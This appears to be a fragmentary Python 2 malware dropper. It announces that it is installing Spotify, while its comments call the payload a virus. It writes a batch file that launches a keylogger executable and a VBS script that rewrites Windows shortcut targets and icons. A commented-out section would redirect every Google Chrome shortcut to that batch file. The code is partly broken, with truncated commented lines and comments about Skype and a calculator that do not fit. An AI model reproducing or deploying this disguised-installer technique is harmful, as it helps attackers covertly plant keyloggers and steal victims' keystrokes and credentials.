import os
from subprocess import check_output

print "installing Spotify"

#install the virus
#open the exe file of skype installation


#find the path of skype exe in this computer
spotify_exe_path=check_output("cd/ & dir /b /s SpotifySetup.exe", shell=True)
print spotify_exe_path
spotify_exe_path=spotify_exe_path.splitlines()[0]

#get the current path
curr_path=os.getcwd()

#create the content of the bat file, replace $ with the path of the chrome exe, and * with the path of the keylogger exe
bat_script = open("td", "w")
content = '@echo off\nstart "" "' + curr_path+'\dist\key\key.exe' #+ '"\nstart "" "' + spotify_exe_path +'"'
bat_script.write(content)
bat_script.close()


#create a vbs script that changes shortcuts
shortcut_change_script=open("sc.vbs", "w")
shortcut_change_script.write("""Set sh = CreateObject("WScript.Shell")
set shortcut = sh.CreateShortcut(WScript.Arguments.Item(0))
shortcut.TargetPath = WScript.Arguments.Item(1)
shortcut.IconLocation =WScript.Arguments.Item(2)
shortcut.Save""")
shortcut_change_script.close()

"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"



#con_path=curr_path+"\html.ico"
#at_path=curr_path+"\k.bat"

#find all the paths of shortcuts to google chrome in the computer
#hrome_shortcut_paths=check_output('cd/ & dir /b /s "Google Chrome.lnk"', shell=True)

#change every chrome shortcut to open the batch file instead of the chrome exe
#or chrome_shortcut_path in chrome_shortcut_paths.splitlines():
#   if len(chrome_shortcut_path) != 0:

#       cmd="cscript sc.vbs "+chrome_shortcut_path+" "+bat_path+" "+icon_path
#       check_output(cmd,shell=True)


#remove the vbs script, as it is no longer neaded
#s.remove("sc.vbs")

#create a dummy exe file that represents the calculator
#alc_exe=open("calculator.exe","w")
#alc_exe.close()
